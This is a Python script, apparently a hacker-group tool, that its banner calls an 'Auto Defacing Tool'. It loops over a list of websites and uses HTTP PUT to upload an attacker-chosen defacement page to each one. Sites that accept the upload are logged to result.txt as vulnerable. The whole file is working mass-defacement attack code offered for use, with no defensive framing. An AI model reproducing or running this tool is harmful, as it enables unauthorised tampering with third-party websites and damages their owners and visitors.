#!/usr/bin/python
#CYBER_DEADSHOT
#CODED BY D34D_5H07

try:
   import requests
   import os.path
   import sys
   import os
except ImportError:
   exit("install requests and try again ...")

banner = """
██████╗ ███████╗ █████╗ ██████╗ ███████╗██╗  ██╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
██║  ██║█████╗  ███████║██║  ██║███████╗███████║██║   ██║   ██║
██║  ██║██╔══╝  ██╔══██║██║  ██║╚════██║██╔══██║██║   ██║   ██║
██████╔╝███████╗██║  ██║██████╔╝███████║██║  ██║╚██████╔╝   ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝
                     >>CODED BY D34D_5H07<<
                   >>CLICK CNTRL+C  TO STOP<<
      >>YOU CAN FIND THE LIST OF DEFACED SITES IN result.txt <<
"""

os.system("figlet DEFACE")
option = input ("Would You like to Begin Auto Defacing Tool Coded By D34D_5H07 :-(y/n)")
if (option=="y"):
        print("")
        print(banner)
        os.system("clear")           
elif(option=="n"):
        print("")
        print("Exiting...")
        os.system("sleep 1")
        os.system("clear")
        print(banner)
        os.system("sleep 2")
        os.system("clear")
        exit()

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'
file = open('result.txt','w')

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)

   return str(ipt)
def aox(script,target_file="list.txt"):
   dface = "/"+script+"\n"
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("File Upload to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" no vuln"+m+" ] %s/%s"%(site,script))
            else:
               invisible = site + dface
               file.write(invisible)
               print(m+"["+h+" vuln "+m+" ] %s/%s"%(site,script))
         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x(" Your Deface : ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)
   file.close()

if __name__ == "__main__":
    main(banner)
p
